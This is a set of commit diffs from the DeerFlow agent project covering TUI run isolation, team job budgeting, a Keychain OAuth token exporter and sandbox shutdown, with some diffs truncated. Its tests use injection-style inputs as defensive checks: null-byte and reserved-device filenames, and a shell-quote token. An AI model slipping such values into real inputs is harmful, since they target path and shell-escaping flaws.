@@ -203,6 +203,29 @@ def test_reserved_staging_shelf_rename_rejected_before_promotion(self, tmp_path,
             assert source.read_bytes() == b"user document"
             assert client.get(f"/api/projects/{pid}/documents").json()["total"] == 0
 
+    @pytest.mark.parametrize("filename", ["report\x00.txt", "CON.txt", "com³.txt", "report.txt."])
+    def test_invalid_explicit_name_rejected_before_shelf_upload(self, tmp_path, filename):
+        app = _build_app(tmp_path)
+        with TestClient(app, raise_server_exceptions=False) as client:
+            pid = _create_project(client)["id"]
+            response = client.post(f"/api/projects/{pid}/documents", files={"file": ("safe.txt", b"user document")}, data={"name": filename})
+            assert response.status_code == 400
+            assert client.get(f"/api/projects/{pid}/documents").json()["total"] == 0
+            assert not (get_paths().project_documents_dir(_USER, pid) / ".staging").exists()
+
+    @pytest.mark.parametrize("filename", ["report\x00.txt", "CON.txt", "com³.txt", "report.txt."])
+    def test_invalid_explicit_name_rejected_before_shelf_promotion(self, tmp_path, filename):
+        app = _build_app(tmp_path)
+        with TestClient(app, raise_server_exceptions=False) as client:
+            pid = _create_project(client)["id"]
+            _seed_thread(app, "thread-1")
+            source = _thread_file("thread-1", "output", "notes.txt", b"user document")
+            response = _promote(client, pid, thread_id="thread-1", kind="output", name="notes.txt", shelf_name=filename)
+            assert response.status_code == 400
+            assert source.read_bytes() == b"user document"
+            assert client.get(f"/api/projects/{pid}/documents").json()["total"] == 0
+            assert not (get_paths().project_documents_dir(_USER, pid) / ".staging").exists()
+
     def test_promote_upload_with_default_name_records_provenance(self, tmp_path):
         app = _build_app(tmp_path)
         with TestClient(app) as client:
```

---

### Incident Patch 11: `3a2f768d` (2026-10-05)
**Commit Message**: fix(tui): isolate callbacks from interrupted runs (#6302)

* fix(tui): isolate callbacks from interrupted runs

* fix(tui): recover when agent worker creation fails

---------

Co-authored-by: LingYi-Liang <[REDACTED_EMAIL]>
Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `README.md` (modified, +3/-2)
```diff
@@ -2510,8 +2510,9 @@ A keyboard-driven chat surface with a streaming transcript (Markdown-rendered an
 During an active run, `/resume`, `/threads`, and `/switch` ask you to wait before
 switching conversations. An invalid `/resume` reference displays an error without
 closing the TUI or changing the current conversation.
-After an interrupt and conversation switch, late stream actions from the previous
-thread cannot change the new conversation's display or run state.
+After an interrupt, late stream actions from the previous run cannot change the
+next run's display or status, even when both prompts use the same conversation.
+If a run cannot start, the TUI reports an error and returns to idle so you can retry.
 
 At the last composer row, `Down` leaves an unsent draft untouched unless you are
 browsing input history; after recalling history, it moves forward to restore your
```

**File**: `backend/docs/TUI.md` (modified, +4/-2)
```diff
@@ -111,8 +111,10 @@ semantics as elsewhere in DeerFlow). `/model` and `/threads` open modal pickers.
 opens the thread picker. During an active run, `/resume`, `/threads`, and `/switch`
 ask you to wait instead of switching away from in-flight output. An invalid
 `/resume` reference displays an error and leaves the current conversation intact.
-After an interrupt and conversation switch, late stream actions from the previous
-thread are discarded when they reach the UI.
+After an interrupt, late stream actions from the previous run are discarded when
+they reach the UI, even if the next prompt uses the same conversation. Its final
+usage, title, and completion event cannot replace those of the new run.
+If a run cannot start, the TUI reports an error and returns to idle so you can retry.
 
 Use `/goal <condition>` to set the active thread goal, `/goal` to show it, and
 `/goal clear` to clear it.
```

**File**: `backend/packages/harness/deerflow/tui/AGENTS.md` (modified, +11/-4)
```diff
@@ -18,10 +18,17 @@ and when applying the picker callback, which may outlive the idle state in which
 it opened. Keep the current thread and transcript unchanged when rejecting a
 switch. Report invalid resume references as error rows without relaxing the
 canonical thread-id validation or terminating the app.
-Worker actions must carry their originating thread id into the UI callback.
-Check it against the displayed thread on delivery, not just before scheduling:
-an interrupt/switch can race with the worker's cancellation check. Drop actions
-for another thread before they reach the reducer or change streaming state.
+Reserve the run identity and busy state when accepting input, before its worker
+starts. Each run owns its cancellation flag; a later send must not reset it.
+If worker creation fails, cancel and clear that reserved run, restore idle state,
+and show a retryable error. Do not cancel a previously completed run's title write.
+Worker callbacks check both run identity and thread id on UI delivery, rejecting
+cancelled, completed, or superseded runs before updating the reducer. Keep the
+completed run's state available for its worker's title persistence check. An
+uncancelled, normally completed run still writes its title to its original
+thread after the UI moves on; keep that write off the UI thread. This does not
+order completed title writes, roll back a write already in progress, or force
+stop synchronous backend work.
 
 `InputHistory.down()` returns `None` when history navigation is inactive; the
 app must then leave the composer untouched, including its cursor and undo state.
```

**File**: `backend/packages/harness/deerflow/tui/app.py` (modified, +45/-18)
```diff
@@ -9,7 +9,9 @@
 from __future__ import annotations
 
 import uuid
+from dataclasses import dataclass, field
 from functools import partial
+from threading import Event
 
 from textual.app import App, ComposeResult
 from textual.binding import Binding
@@ -41,6 +43,15 @@
 _HELP_TEXT = f"{format_command_help()}\n{_HELP_KEYS}"
 
 
+@dataclass(eq=False)
+class _Run:
+    """Delivery and cancellation state owned by one worker run."""
+
+    thread_id: str
+    cancelled: Event = field(default_factory=Event)
+    finished: bool = False
+
+
 _TRANSPARENT_CSS = """
 Screen,
 #header,
@@ -190,7 +201,7 @@ def __init__(self, session, plan) -> None:
         self._skills = 0
         self._spinner_idx = 0
         self._streaming = False
-        self._cancelled = False
+        self._run: _Run | None = None
         self._skills_meta: list[dict] = []
         self._model_override: str | None = None
         self._palette_open = False
@@ -644,16 +655,27 @@ def _send_to_agent(self, text: str) -> None:
             return
         if self._conv_thread_id is None:
             self._conv_thread_id = str(uuid.uuid4())
-        self._cancelled = False
+        run = _Run(self._conv_thread_id)
+        self._run = run
+        self._streaming = True
         self._dispatch(UserSubmitted(text))
-        self.run_worker(
-            partial(self._stream_worker, text, self._conv_thread_id),
-            thread=True,
-            exclusive=True,
-            group="agent",
-        )
+        try:
+            self.run_worker(
+                partial(self._stream_worker, text, run),
+                thread=True,
+                exclusive=True,
+                group="agent",
+            )
+        except Exception:  # noqa: BLE001 - worker creation must release the busy reservation
+            run.cancelled.set()
+            self._run = None
+            self._streaming = False
+            self._dispatch(SystemMessage("Could not start the run. Please try again.", tone="error"))
 
-    def _stream_worker(self, text: str, thread_id: str) -> None:
+    def _stream_worker(self, text: str, run: _Run) -> None:
+        if run.cancelled.is_set():
+            return
+        thread_id = run.thread_id
         kwargs: dict = {}
         if self._model_override:
             kwargs["model_name"] = self._model_override
@@ -667,23 +689,27 @@ def _stream_worker(self, text: str, thread_id: str) -> None:
 
         latest_title: str | None = None
         for action in stream_actions(self.session.client, text, thread_id=thread_id, **kwargs):
-            if self._cancelled:
+            if run.cancelled.is_set():
+                break
+            if not self.call_from_thread(self._on_stream_action, run, action):
                 break
             if isinstance(action, ThreadTitle):
                 latest_title = action.title
-            self.call_from_thread(self._on_stream_action, thread_id, action)
 
         # Only persist a title for a run that completed normally — an interrupted
         # run may only have emitted the title middleware's first, truncated guess.
-        if writer is not None and latest_title and not self._cancelled:
+        if writer is not None and latest_title and run.finished and not run.cancelled.is_set():
             writer.set_title(thread_id, latest_title)
 
-    def _on_stream_action(self, thread_id: str, action) -> None:
-        # Interrupt/switch may happen after the worker's cancellation check.
-        # Validate the destination when Textual delivers the action to the UI.
-        if thread_id != self._conv_thread_id:
-            return
+    def _on_stream_action(self, run: _Run, action) -> bool:
+        # Cancellation and a new send can occur after the worker's check,
+        # including when both runs belong to the same conversation.
+        if self._run is not run or run.thread_id != self._conv_thread_id or run.cancelled.is_set() or run.finished:
+            return False
+        if isinstance(action, RunEnded):
+            run.finished = True
         self._on_action(action)
+        return True
 
     def _on_action(self, action) -> None:
         self.state = reduce(self.state, action)
@@ -720,7 +746,8 @@ def action_escape(self) -> None:
             self._interrupt_run()
 
     def _interrupt_run(self) -> None:
-        self._cancelled = True
+        if self._run is not None:
+            self._run.cancelled.set()
         self.workers.cancel_group(self, "agent")
         self._streaming = False
         self.state = reduce(self.state, RunEnded())
```

**File**: `backend/tests/test_tui_run_isolation.py` (added, +346/-0)
```diff
@@ -0,0 +1,346 @@
+"""Per-run delivery through the real Textual worker, pilot and view reducer."""
+
+import asyncio
+import threading
+
+import pytest
+
+from deerflow.client import StreamEvent
+from deerflow.tui.app import DeerFlowTUI
+from deerflow.tui.cli import LaunchPlan
+from deerflow.tui.session import Session
+from deerflow.tui.view_state import AssistantDelta, RunEnded, RunStarted, ThreadTitle
+
+
+class _Client:
+    def __init__(self):
+        self.release_old = threading.Event()
+        self.release_new = threading.Event()
+        self.new_started = threading.Event()
+        self.old_terminal_emitted = threading.Event()
+        self.calls = []
+
+    def list_models(self):
+        return {"models": []}
+
+    def list_skills(self, **kwargs):
+        return {"skills": []}
+
+    def list_threads(self, **kwargs):
+        return {"thread_list": [{"thread_id": "thread-a", "title": "A"}, {"thread_id": "thread-b", "title": "B"}]}
+
+    def stream(self, message, *, thread_id=None, **kwargs):
+        self.calls.append((message, thread_id))
+        old = message == "old question"
+        prefix = "old" if old else "new"
+        if not old:
+            yield StreamEvent(type="values", data={"title": "New title"})
+        yield StreamEvent(type="messages-tuple", data={"type": "ai", "content": f"{prefix}-before ", "id": f"{prefix}-answer"})
+        if not old:
+            self.new_started.set()
+        release = self.release_old if old else self.release_new
+        if not release.wait(10):
+            raise TimeoutError("Controlled stream was not released")
+        yield StreamEvent(type="messages-tuple", data={"type": "ai", "content": f"{prefix}-tail", "id": f"{prefix}-answer"})
+        if old:
+            yield StreamEvent(type="values", data={"title": "Old title"})
+            self.old_terminal_emitted.set()
+        yield StreamEvent(type="end", data={"usage": {"total_tokens": 111 if old else 222}})
+
+
+class _Writer:
+    def __init__(self):
+        self.titles = []
+
+    def ensure_created(self, *args, **kwargs):
+        pass
+
+    def set_title(self, thread_id, title):
+        self.titles.append((thread_id, title, threading.get_ident()))
+
+
+async def _settle(pilot, predicate):
+    for _ in range(200):
+        await pilot.pause()
+        if predicate():
+            return
+        await asyncio.sleep(0.01)
+    raise AssertionError("Expected controlled UI event did not arrive")
+
+
+async def _late_delivery(monkeypatch, gate, switch_thread=False, restart=True):
+    client, writer = _Client(), _Writer()
+    app = DeerFlowTUI(Session(client=client, writer=writer), LaunchPlan(mode="tui", thread_id="thread-a"))
+    queued, deliver, old_done, new_done = (threading.Event() for _ in range(4))
+    old_worker_id = None
+    original_worker, original_callback = app._stream_worker, app.call_from_thread
+
+    def observed_worker(text, *args):
+        nonlocal old_worker_id
+        if text == "old question":
+            old_worker_id = threading.get_ident()
+        try:
+            return original_worker(text, *args)
+        finally:
+            (old_done if text == "old question" else new_done).set()
+
+    def gated_callback(callback, *args):
+        action = args[-1]
+        is_old = threading.get_ident() == old_worker_id
+        pause = (gate == "delta" and isinstance(action, AssistantDelta) and action.text == "old-tail") or (gate == "title" and isinstance(action, ThreadTitle)) or (gate == "end" and isinstance(action, RunEnded))
+        if is_old and pause:
+            queued.set()
+            if not deliver.wait(10):
+                raise TimeoutError("Controlled UI delivery was not released")
+        return original_callback(callback, *args)
+
+    monkeypatch.setattr(app, "_stream_worker", observed_worker)
+    monkeypatch.setattr(app, "call_from_thread", gated_callback)
+    async with app.run_test() as pilot:
+        try:
+            await pilot.pause()
+            app.query_one("#composer").value = "old question"
+            await pilot.press("enter")
+            await _settle(pilot, lambda: app._streaming and any(row.kind == "assistant" for row in app.state.rows))
+            client.release_old.set()
+            await _settle(pilot, queued.is_set)
+            if gate == "end":
+                # The old source has emitted its terminal event; only UI delivery
+                # is pending, so this case needs no overlapping backend runs.
+                assert client.old_terminal_emitted.is_set()
+            await pilot.press("ctrl+c")
+            if restart:
+                if switch_thread:
+                    app.query_one("#composer").value = "/resume thread-b"
+                    await pilot.press("enter")
+                app.query_one("#composer").value = "new question"
+                await pilot.press("enter")
+                await _settle(pilot, lambda: client.new_started.is_set() and app._streaming)
+            deliver.se
```

---

### Incident Patch 12: `4d9f1d7a` (2026-10-05)
**Commit Message**: fix(extensions): exclude unadmitted team waits from active budget (#6298)

* fix(extensions): exclude unadmitted team waits from active budget

* docs(extensions): explain frozen team input reservation

**File**: `backend/tests/test_agent_teams_plugin.py` (modified, +71/-0)
```diff
@@ -258,6 +258,77 @@ async def uncertain(**kwargs):
     assert len(runs.starts) == 1
 
 
+async def queue_active_budget_jobs(actions, runs):
+    jobs = []
+    for index in range(5):
+        owner = "bob" if index == 4 else "alice"
+        team = await actions["create"](
+            {"request_id": f"team-{index}", "name": "Release", "goal": "Check readiness", "members": [{"name": "Research", "agent": "researcher"}, {"name": "Review", "agent": "reviewer"}]},
+            context(runs, owner),
+        )
+        for member in team["members"]:
+            if len(jobs) == 9:
+                break
+            payload = {"team_id": team["id"], "member_id": member["id"], "text": "Check", "request_id": f"job-{len(jobs)}"}
+            sent = await actions["send"](payload, context(runs, owner))
+            jobs.append({**sent, "owner": owner, "team_id": team["id"], "member_id": member["id"], "thread_id": member["thread_id"]})
+    return jobs
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("wait_kind", ["interrupt", "clarification"])
+async def test_unadmitted_conversation_waits_do_not_consume_other_teams_active_budget(plugin, wait_kind):
+    from deerflow.agents.middlewares.clarification_middleware import ClarificationMiddleware
+
+    _, actions, service = plugin
+    runs = Runs()
+    jobs = await queue_active_budget_jobs(actions, runs)
+    for job in jobs[:8]:
+        state = runs.threads[job["thread_id"]]
+        if wait_kind == "interrupt":
+            state.update(next=["tools"], interrupts=[{"value": "Approve?"}])
+        else:
+            request = SimpleNamespace(tool_call={"name": "ask_clarification", "id": "outside", "args": {"question": "Which environment?", "clarification_type": "missing_info"}}, runtime=None)
+            command = ClarificationMiddleware().wrap_tool_call(request, lambda _: pytest.fail("tool handler should be intercepted"))
+            state["values"]["messages"].extend(m.model_dump() for m in command.update["messages"])
+    # A later request on the same waiting conversation must still remain queued.
+    blocked = jobs[0]
+    await actions["send"]({"team_id": blocked["team_id"], "member_id": blocked["member_id"], "text": "Later", "request_id": "later"}, context(runs))
+    for _ in range(2):
+        await service.tick()
+        assert [thread for thread, _ in runs.starts] == [jobs[-1]["thread_id"]]
+        for job in jobs[:8]:
+            stored = await service.db("get", job["owner"], job["team_id"])
+            assert all(item["status"] == "queued" and item["input"] is None for item in stored["jobs"])
+    healthy = await actions["get"]({"team_id": jobs[-1]["team_id"]}, context(runs, "bob"))
+    assert healthy["jobs"][0]["status"] == "running"
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize("lost_ack", [False, True])
+async def test_active_budget_retains_real_and_ambiguous_admissions(plugin, monkeypatch, lost_ack):
+    _, actions, service = plugin
+    runs = Runs()
+    jobs = await queue_active_budget_jobs(actions, runs)
+    if lost_ack:
+        start = runs.start
+
+        async def uncertain(**kwargs):
+            await start(**kwargs)
+            raise TimeoutError("admitted but acknowledgement lost")
+
+        monkeypatch.setattr(runs, "start", uncertain)
+    for _ in range(2):
+        await service.tick()
+        assert len(runs.starts) == 8
+        assert jobs[-1]["id"] not in runs.runs
+        for job in jobs[:8]:
+            stored = await service.db("get", job["owner"], job["team_id"])
+            assert all(item["input"] is not None for item in stored["jobs"])
+    healthy = await service.db("get", "bob", jobs[-1]["team_id"])
+    assert healthy["jobs"][0]["status"] == "queued" and healthy["jobs"][0]["input"] is None
+
+
 @pytest.mark.asyncio
 async def test_cancel_stops_a_running_request_and_pending_delete_is_rejected(plugin):
     _, actions, service = plugin
```

**File**: `examples/deerflow-extension-agent-teams/AGENTS.md` (modified, +3/-0)
```diff
@@ -15,6 +15,9 @@ Unknown admission outcomes must retain ownership of the pending job. Never
 automatically approve interruptions, infer success from a terminal run alone, or
 serialize a host capability. Only an authenticated action or native mention
 rebinds after restart.
+Release a new job's temporary active-budget reservation only if its input remains
+unfrozen after advancement; conversation waits must not block unrelated teams.
+Keep frozen inputs charged even when admission acknowledgement is lost.
 
 Reconnect ensures every member thread before persisting readiness, serialized
 with deletion and task updates. Count only requests toward the 100-request cap;
```

**File**: `examples/deerflow-extension-agent-teams/README.md` (modified, +2/-0)
```diff
@@ -99,6 +99,8 @@ own teams. Sharing a host conversation does **not** share its team's private dat
   fairness and finer-grained locking are outside this example's current scope.
   Each conversation is serialized, including result
   receipts. A busy host conversation stays queued without cancelling its run.
+  Queued jobs blocked by an unanswered question or interrupt do not consume the
+  active-job budget before admission; an unknown admission outcome still does.
 - Each owner can have 20 teams. A team accepts at most 100 requests, with separate
   space for up to 100 result receipts (200 total job entries); a handoff chain
   accepts at most 12 requests. Start a new user request for another chain, or a
```

**File**: `examples/deerflow-extension-agent-teams/deerflow_extension_agent_teams/service.py` (modified, +8/-1)
```diff
@@ -392,7 +392,8 @@ async def tick(self):
                     if job["status"] in TERMINAL or job["thread_id"] in occupied:
                         continue
                     occupied.add(job["thread_id"])
-                    if job["status"] == "queued" and job["input"] is None:
+                    reserved = job["status"] == "queued" and job["input"] is None
+                    if reserved:
                         if active >= 8:
                             continue
                         active += 1
@@ -414,6 +415,11 @@ async def tick(self):
                         # Disconnect rather than releasing the member's slot.
                         self.handles.pop((owner, team_id), None)
                         break
+                    finally:
+                        # A conversation wait did not attempt admission. Frozen
+                        # inputs retain the slot, including unknown outcomes.
+                        if reserved and job["input"] is None:
+                            active -= 1
 
     async def save_job(self, owner, team_id, job):
         def update(team):
@@ -443,6 +449,7 @@ async def advance(self, owner, team, job, runs):
                 "Use the exact registered tool names in your tool list. Your final answer is automatically returned to the requester; "
                 "do not send a separate peer request just to report completion. Do not wait in a polling loop.\n"
             ) + json.dumps({"request": job["text"], "your_member_id": job["member_id"], "source_thread": job["source"], "kind": job["kind"], **shared(team)}, ensure_ascii=False)
+            # Freeze and persist input before start(): tick releases reservations only while input is None.
             job["input"] = {"messages": [{"role": "user", "id": "team-" + job["id"], "content": content}]}
             await self.save_job(owner, team["id"], job)
         if job["run_id"] is None:
```

---

### Incident Patch 13: `2970aa43` (2026-10-05)
**Commit Message**: fix(scripts): reject invalid Claude Keychain credential containers (#6281)

* fix(scripts): validate Claude Keychain export credentials

* fix(scripts): reuse validated Keychain access token

**File**: `README.md` (modified, +2/-0)
```diff
@@ -337,6 +337,8 @@ For Google's official Gemini OpenAI-compatible endpoint, use the
    eval "$(python3 scripts/export_claude_code_oauth.py --print-export)"
    ```
 
+   The exporter rejects malformed credential containers and non-string or blank access tokens before printing a token, emitting a shell export, or writing a credentials file. Valid tokens are exported unchanged, and file exports preserve the full credential container.
+
    API keys can also be set manually in `.env` (recommended) or exported in your shell:
 
    ```bash
```

**File**: `backend/tests/test_claude_keychain_export.py` (added, +121/-0)
```diff
@@ -0,0 +1,121 @@
+"""Exercise the manual OAuth exporter with synthetic Keychain responses."""
+
+import importlib.util
+import json
+import shlex
+from argparse import Namespace
+from pathlib import Path
+from types import SimpleNamespace
+
+import pytest
+
+
+@pytest.fixture
+def exporter(monkeypatch):
+    script = Path(__file__).resolve().parents[2] / "scripts" / "export_claude_code_oauth.py"
+    spec = importlib.util.spec_from_file_location("claude_keychain_export", script)
+    module = importlib.util.module_from_spec(spec)
+    spec.loader.exec_module(module)
+    monkeypatch.setattr(module.platform, "system", lambda: "Darwin")
+    return module
+
+
+def mock_keychain(exporter, monkeypatch, payload):
+    response = SimpleNamespace(returncode=0, stdout=json.dumps(payload), stderr="")
+    monkeypatch.setattr(exporter, "subprocess", SimpleNamespace(run=lambda *args, **kwargs: response))
+
+
+INVALID_CONTAINERS = [
+    None,
+    [],
+    "synthetic-secret",
+    42,
+    {"claudeAiOauth": None},
+    {"claudeAiOauth": []},
+    {"claudeAiOauth": "synthetic-secret"},
+    {"claudeAiOauth": {"accessToken": None}},
+    {"claudeAiOauth": {"accessToken": True}},
+    {"claudeAiOauth": {"accessToken": 42}},
+    {"claudeAiOauth": {"accessToken": ["synthetic-secret"]}},
+    {"claudeAiOauth": {"accessToken": {"value": "synthetic-secret"}}},
+    {"claudeAiOauth": {"accessToken": ""}},
+    {"claudeAiOauth": {"accessToken": " \t\n"}},
+]
+
+
+@pytest.mark.parametrize("payload", INVALID_CONTAINERS)
+@pytest.mark.parametrize("action", ["print_token", "print_export", "write_credentials"])
+def test_invalid_keychain_container_fails_without_exporting(exporter, monkeypatch, tmp_path, capsys, payload, action):
+    mock_keychain(exporter, monkeypatch, payload)
+    destination = tmp_path / "credentials.json"
+    args = Namespace(
+        service="synthetic-service",
+        account="synthetic-account",
+        show_target=False,
+        print_token=False,
+        print_export=False,
+        write_credentials=None,
+    )
+    setattr(args, action, destination if action == "write_credentials" else True)
+    monkeypatch.setattr(exporter, "parse_args", lambda: args)
+
+    assert exporter.main() == 1
+
+    captured = capsys.readouterr()
+    assert captured.out == ""
+    assert captured.err == "Claude Code Keychain item did not contain claudeAiOauth.accessToken.\n"
+    assert "synthetic-secret" not in captured.err
+    assert not destination.exists()
+
+
+@pytest.mark.parametrize("token", ["synthetic-token'with-shell-quote", " synthetic-token "])
+def test_valid_container_preserves_all_export_modes(exporter, monkeypatch, tmp_path, capsys, token):
+    payload = {
+        "claudeAiOauth": {
+            "accessToken": token,
+            "refreshToken": "synthetic-refresh",
+            "expiresAt": 123,
+        },
+        "metadata": "preserved",
+    }
+    mock_keychain(exporter, monkeypatch, payload)
+    destination = tmp_path / "credentials.json"
+    args = Namespace(
+        service="synthetic-service",
+        account="synthetic-account",
+        show_target=False,
+        print_token=True,
+        print_export=True,
+        write_credentials=destination,
+    )
+    monkeypatch.setattr(exporter, "parse_args", lambda: args)
+
+    assert exporter.main() == 0
+
+    captured = capsys.readouterr()
+    assert captured.out == f"{token}\nexport CLAUDE_CODE_OAUTH_TOKEN={shlex.quote(token)}\n"
+    assert captured.err == f"Wrote Claude Code credentials to {destination}\n"
+    assert json.loads(destination.read_text(encoding="utf-8")) == payload
+
+
+def test_export_uses_validated_token_without_reextracting_container(exporter, monkeypatch, tmp_path, capsys):
+    token = "synthetic-validated-token"
+    payload = {"metadata": "opaque-container"}
+    monkeypatch.setattr(exporter, "load_keychain_container", lambda **kwargs: (payload, token))
+    destination = tmp_path / "credentials.json"
+    args = Namespace(
+        service="synthetic-service",
+        account="synthetic-account",
+        show_target=False,
+        print_token=True,
+        print_export=True,
+        write_credentials=destination,
+    )
+    monkeypatch.setattr(exporter, "parse_args", lambda: args)
+
+    assert exporter.main() == 0
+
+    captured = capsys.readouterr()
+    assert captured.out == f"{token}\nexport CLAUDE_CODE_OAUTH_TOKEN={shlex.quote(token)}\n"
+    assert captured.err == f"Wrote Claude Code credentials to {destination}\n"
+    assert json.loads(destination.read_text(encoding="utf-8")) == payload
```

**File**: `scripts/AGENTS.md` (modified, +10/-0)
```diff
@@ -1,3 +1,13 @@
+## Manual Claude OAuth Export
+
+`export_claude_code_oauth.py` validates Keychain JSON as an object containing an
+object `claudeAiOauth` and a nonblank string `accessToken` before any export action.
+Malformed containers use the existing token-missing error without exposing their
+contents. The loader returns the full container together with the validated token;
+export actions use that token without repeating credential-shape assumptions or
+trimming its contents. Offline CLI coverage:
+`backend/tests/test_claude_keychain_export.py`.
+
 ## Service Startup Contracts
 
 Optional browser dependency detection reads the top-level `tools:` sequence
```

**File**: `scripts/export_claude_code_oauth.py` (modified, +6/-7)
```diff
@@ -44,7 +44,7 @@ def default_account_name() -> str:
     return os.getenv("USER") or "claude-code-user"
 
 
-def load_keychain_container(service: str, account: str) -> dict[str, Any]:
+def load_keychain_container(service: str, account: str) -> tuple[dict[str, Any], str]:
     if platform.system() != "Darwin":
         raise RuntimeError("Claude Code Keychain export is only supported on macOS.")
 
@@ -71,11 +71,12 @@ def load_keychain_container(service: str, account: str) -> dict[str, Any]:
     except json.JSONDecodeError as exc:
         raise RuntimeError("Claude Code Keychain item did not contain valid JSON.") from exc
 
-    access_token = data.get("claudeAiOauth", {}).get("accessToken", "")
-    if not access_token:
+    oauth = data.get("claudeAiOauth") if isinstance(data, dict) else None
+    access_token = oauth.get("accessToken") if isinstance(oauth, dict) else None
+    if not isinstance(access_token, str) or not access_token.strip():
         raise RuntimeError("Claude Code Keychain item did not contain claudeAiOauth.accessToken.")
 
-    return data
+    return data, access_token
 
 
 def write_credentials_file(output_path: Path, data: dict[str, Any]) -> None:
@@ -141,13 +142,11 @@ def main() -> int:
         return 0
 
     try:
-        data = load_keychain_container(service=args.service, account=args.account)
+        data, access_token = load_keychain_container(service=args.service, account=args.account)
     except RuntimeError as exc:
         print(str(exc), file=sys.stderr)
         return 1
 
-    access_token = data["claudeAiOauth"]["accessToken"]
-
     if args.print_token:
         print(access_token)
 
```

---

### Incident Patch 14: `6cdc6008` (2026-10-05)
**Commit Message**: fix(e2b): keep shutdown retryable while maintenance workers are live (#6244)

* fix(e2b): retain teardown ownership across maintenance timeout

* fix(e2b): fence acquisition and preserve signal forwarding

* test(e2b): cover shutdown admission and signal forwarding

* docs(e2b): pin shutdown admission and signal invariants

* fix(e2b): scope deferred-cleanup signal handling

* test(e2b): exercise dedicated deferred-cleanup signal error

* style(tests): format E2B shutdown regression tests

---------

Co-authored-by: Willem Jiang <[REDACTED_EMAIL]>

**File**: `backend/packages/harness/deerflow/community/e2b_sandbox/AGENTS.md` (modified, +10/-0)
```diff
@@ -26,3 +26,13 @@ Release only needs the VM lock while leaving active state; do not hold it
 during output sync, which must not prevent ownership heartbeats.
 Track that release in `_remote_ops_in_progress` until it completes so
 reconciliation cannot probe or re-adopt a VM between active and warm states.
+
+Shutdown owns both maintenance workers as well as sandbox registries. After
+signalling the lease-renewal and reconciliation threads, a bounded join is only
+a wait budget: verify each worker actually exited before clearing registries or
+tearing down resources. If either worker is still alive, keep admission fenced
+and preserve all tracked state so a later `shutdown()` can retry cleanup.
+That fence covers cached sync/async acquisition too: recheck after serializer
+waits and immediately before exposing a reused client. Signal-triggered shutdown
+may report deferred cleanup, but it must still forward the process's original
+SIGTERM/SIGINT/SIGHUP action while retaining the pending E2B state.
```

**File**: `backend/packages/harness/deerflow/community/e2b_sandbox/e2b_sandbox_provider.py` (modified, +86/-14)
```diff
@@ -119,6 +119,11 @@
 # Deadline checks stop preflight work and new writes. Active SDK writes finish.
 _MOUNT_PASS_DEADLINE_SECONDS = 120
 
+
+class _E2BMaintenanceShutdownTimeout(RuntimeError):
+    """A bounded maintenance-worker join did not prove worker termination."""
+
+
 # Recursive skill projection replacement must never target an operating-system
 # tree. The configured E2B home is handled separately: an isolated descendant
 # such as /home/user/skills is supported, while the home directory itself and
@@ -329,6 +334,9 @@ def __init__(self) -> None:
         self._transitioning_slots = 0
         self._capacity_cond = threading.Condition(self._lock)
         self._shutdown_called = False
+        # Keep admission fenced if shutdown has to retry after a bounded
+        # maintenance-thread join times out.
+        self._shutdown_cleanup_pending = False
         self._owned_sandbox_ids: set[str] = set()
         self._acquire_inflight: set[str] = set()
         self._orphan_first_seen: dict[str, float] = {}
@@ -358,7 +366,7 @@ def __init__(self) -> None:
         if not self._ownership.supports_cross_process:
             logger.warning("E2B sandbox ownership is process-local. Multi-worker gateways must configure sandbox.ownership.type: redis for safe reconciliation.")
 
-        atexit.register(self.shutdown)
+        atexit.register(self._shutdown_at_exit)
         self._register_signal_handlers()
         self._start_maintenance_threads()
 
@@ -528,6 +536,16 @@ def _capacity_reservation_from_metadata(
 
     # ── Signal / shutdown handling ───────────────────────────────────────
 
+    def _shutdown_at_exit(self) -> None:
+        """Best-effort process-exit cleanup without turning a retryable timeout into an atexit error."""
+        try:
+            self.shutdown()
+        except _E2BMaintenanceShutdownTimeout as exc:
+            logger.warning(
+                "E2B shutdown cleanup is still pending at interpreter exit: %s",
+                exc,
+            )
+
     def _register_signal_handlers(self) -> None:
         try:
             self._original_sigterm = signal.getsignal(signal.SIGTERM)
@@ -537,7 +555,14 @@ def _register_signal_handlers(self) -> None:
             return
 
         def _handler(signum, frame):
-            self.shutdown()
+            try:
+                self.shutdown()
+            except _E2BMaintenanceShutdownTimeout:
+                logger.warning(
+                    "E2B shutdown cleanup is still pending while handling signal %s; forwarding the signal action",
+                    signum,
+                )
+
             if signum == signal.SIGTERM:
                 original = self._original_sigterm
             elif hasattr(signal, "SIGHUP") and signum == signal.SIGHUP:
@@ -562,7 +587,22 @@ def _handler(signum, frame):
                     sig_name,
                 )
 
+    def _raise_if_shutting_down(self) -> None:
+        with self._lock:
+            if not self._shutdown_called:
+                return
+            raise SandboxCapacityExceededError(
+                "Sandbox provider is shutting down; cannot acquire sandbox",
+                active=len(self._sandboxes),
+                warm=len(self._warm_pool),
+                reserved=self._reserved_slots,
+                replicas=int(self._config["replicas"]),
+                retry_after_seconds=30.0,
+                reason="shutdown",
+            )
+
     def acquire(self, thread_id: str | None = None, *, user_id: str | None = None) -> str:
+        self._raise_if_shutting_down()
         effective_user_id = self._effective_acquire_user_id(user_id)
         if thread_id:
             with self._acquire_serializer.hold(self._thread_key(thread_id, effective_user_id)):
@@ -576,6 +616,9 @@ async def acquire_async(self, thread_id: str | None = None, *, user_id: str | No
         return await loop.run_in_executor(self._acquire_executor, acquire)
 
     def _acquire_internal(self, thread_id: str | None, *, user_id: str) -> str:
+        # The serializer may have queued this caller before shutdown started.
+        # Recheck admission after the wait and before any cache/reclaim path.
+        self._raise_if_shutting_down()
         if thread_id:
             cached = self._reuse_in_process_sandbox(thread_id, user_id=user_id)
             if cached is not None:
@@ -630,17 +673,30 @@ def _reuse_in_process_sandbox(self, thread_id: str, *, user_id: str) -> str | No
             self._refresh_remote_timeout(sandbox.client)
         except Exception as e:  # pragma: no cover - defensive
             logger.debug("Failed to refresh timeout on reuse: %s", e)
+        # Shutdown may have started while the remote ping/timeout refresh was
+        # in flight. Do not publish or expose this cached client after admission
+        # closes.
+        self._raise_if_shutting_down()
         self._publish_ownership(sid)
         with self._lock:
             self._acquire_inflight.discard(sid)
-
-        logger
```

**File**: `backend/tests/test_e2b_sandbox_provider.py` (modified, +103/-0)
```diff
@@ -8,6 +8,7 @@
 import json
 import os
 import shutil
+import signal
 import subprocess
 import threading
 import time
@@ -278,6 +279,7 @@ def _make_provider(
     provider._transitioning_slots = 0
